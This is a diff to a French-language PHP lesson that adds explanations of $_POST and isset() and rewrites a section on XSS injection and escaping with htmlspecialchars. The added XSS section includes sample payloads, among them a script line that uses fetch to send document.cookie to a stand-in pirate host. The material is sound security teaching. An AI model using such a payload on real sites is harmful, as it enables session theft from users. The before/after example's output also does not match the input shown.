@@ -998,119 +998,145 @@ if (isset($_POST['identifiant'])) {
 }
 ?>
 ```
+1. $_POST
+
+$_POST est une **superglobale PHP**.
+
+Elle contient les données envoyées par un formulaire HTML avec :
+
+```html
+<form method="post">
+```
+2. isset()
+
+```php
+isset($_POST['nom'])
+```
+
+Vérifie si la variable existe.
+
+👉 Ça évite une erreur si le formulaire n’a pas encore été soumis.
+
+**Sans isset(), PHP afficherait un avertissement.**
+
 
 ### Sécurité
 
 ![](./assets/images/security.gif){.w-100}
 
-Injection XSS, ça vous dit quelque chose ? C'est lorsque l'utilisateur entre du contenu malveillant dans un formulaire et que le contenu est affiché directement sur la page.
+### Injection XSS — c’est un concept très important en sécurité web.
 
-Par exemple, dans un formulaire, si l'utilisateur entre comme valeur dans le champ prénom la valeur suivante : `<script>alert('Hacked!');</script>`, cela pourrait poser problème.
+#### C’est quoi une injection XSS ?
 
-Si en php on prend la valeur `$_POST['prenom']` et on l'enregistre sur le site, et que si on fait un affichage de cette valeur, n'importe où sur le site, une alerte s'affichera.
+**XSS = Cross-Site Scripting**
 
-Imaginez ce qui pourrait arriver si le script exécute du code malveillant.
+C’est une attaque où un utilisateur malveillant :
+
+1. Entre du code JavaScript dans un formulaire
+1. Ce code est enregistré ou affiché sans protection
+1. Le navigateur exécute ce code comme s’il faisait partie du site
+
+👉 Le problème : le navigateur ne sait pas que ce script vient d’un utilisateur.
+
+**Exemple concret**
+
+Un attaquant écrit dans un champ prénom :
+```html
+<script>alert("Hacked!")</script>
+```
+
+Si ton code fait :
+```php
+echo "Bonjour, " . $_POST['prenom'];
+```
+
+Le navigateur reçoit :
 
 ```html
-<form method="post">
-    <!-- L’attaquant entre ceci dans le champ nom :
-
-        "><script>alert("Hacked!")</script>
-
-     -->
-    <input type="text" name="nom">
-    <button type="submit">Envoyer</button>
-</form>
+Bonjour, <script>alert("Hacked!")</script>
 ```
 
+Et le script s’exécute.
+
+**Résultat :**
+
+* Une alerte s’affiche
+* Mais ça pourrait aussi :
+  * Voler des cookies
+  * Rediriger l’utilisateur
+  * Modifier la page
+  * Envoyer des données à un serveur externe
+
+**Pourquoi c’est dangereux ?**
+
+Un vrai attaquant pourrait injecter :
+```html
+<script>
+fetch("https://site-pirate.com/steal?cookie=" + document.cookie);
+</script>
+```
+
+👉 Il vole les sessions des utilisateurs.
+
+**Analyse de ton code**
+
+#### ❌ Version dangereuse
 ```php
-<?php
-$nom = $_POST['nom'];
-
-if (isset($nom)) {
-    // ❌ Aucune protection
-    echo "Bonjour, " . $nom;
-
-    // ⚠️ Ok
-    echo "Bonjour, " . htmlspecialchars($nom);
-
-    // ✅ Sécurisé
-    echo "Bonjour, " . htmlspecialchars($nom, ENT_QUOTES, 'UTF-8');
-}
-?>
+echo "Bonjour, " . $nom;
 ```
 
-| Avant | Apres |
-|-------|-------|
-| `"><script>alert("XSS")</script>` | `&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;` |
+Tu affiches directement la donnée utilisateur.
+Le navigateur l’interprète comme du HTML.
 
-Les caractères spéciaux sont convertis en entités HTML, empêchant leur exécution !
-
-## Récapitulatif
-
-![](./assets/images/designer_dev.gif)
-
-Regardons ce script et analysons son fonctionnement.
-
+#### ⚠️ Version partiellement correcte
 ```php
-<?php
-function obtenirMessage($nb, $msg) {
-  if ($nb >= 80) {
-      return $msg["excellent"];
-  } elseif ($nb >= 50) {
-      return $msg["moyen"];
-  } else {
-      return $msg["faible"];
-  }
-}
-
-$nom_utilisateur = isset($_POST["nom"]) ? htmlspecialchars($_POST["nom"], ENT_QUOTES, 'UTF-8') : "Invité";
-$note = rand(0, 100);
-
-$messages = [
-    "excellent" => "Bravo, $nom_utilisateur ! Tu as un score impressionnant ! 🎉",
-    "moyen" => "Pas mal, $nom_utilisateur. Tu peux encore progresser ! 💪",
-    "faible" => "Oups, $nom_utilisateur... Il faut réessayer ! 😅"
-];
-
-echo "<h1>Bienvenue, $nom_utilisateur !</h1>";
-echo "<p>Ta note est de <strong>$note</strong>%.</p>";
-echo "<p>" . obtenirMessage($note, $messages) . "</p>";
-
-$matieres = ["Philosophie", "Mathématiques", "Biologie", "Astronomie"];
-
-echo "<h2>Matières :</h2>";
-echo "<ul>";
-foreach ($matieres as $matiere) {
-    echo "<li>$matiere</li>";
-}
-echo "</ul>";
-
-$choix_matiere = "Philosophie";
-
-echo "<h2>Matière préférée :</h2>";
-switch ($choix_matiere) {
-    case "Philosophie":
-        echo "<p>Ah, l'art de comprendre le monde.</p>";
-        break;
-    case "Mathématiques":
-        echo "<p>Oh, le langage de la nature !</p>";
-        break;
-    default:
-        echo "<p>Intéressant !</p>";
-}
-?>
-
-<hr>
-
-<form method="post" action="index.php">
-    <label for="nom">Entre ton nom :</label>
-    <input type="text" name="nom" id="nom" placeholder="Ex : Nietzsche" required>
-    <button type="submit">Envoyer</button>
-</form>
+htmlspecialchars($nom);
 ```
 
-[*](https://web4.tim-momo.com/lecture)
+Convertit les caractères spéciaux :
+
+| Caractère   | Devient   |
+| ----------- | ----------- |
+| <   		  | `&lt;`  |
+| >   		  | `&gt;`  |
+| "  		  | `&quot;`  |
+| '   		  |	`&#039;`	|
+
+Donc :
+```php
+<script>
+```
+
+devient :
+```markdown
+&lt;script&gt;
+```
+
+Le navigateur l’affiche comme du texte, pas comme du code.
+
+#### ✅ Version sécurisée recommandée
+```php
+htmlspecialchars($nom, ENT_QUOTES, 'UTF-8');
+```
+
+Pourquoi mieux ?
+
+* **ENT_QUOTES** protège aussi les apostrophes
+* **UTF-8** évite des failles liées à l’encodage
+
+**Avant / Après**
+
+Entrée utilisateur :
+```php
+<script>alert("XSS")</script>
+```
+
+Affichage sécurisé :
+```markdown
+&quot;&gt;&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;
+```
+
+Le script ne s’exécute pas.
 
 ## Exercices
 
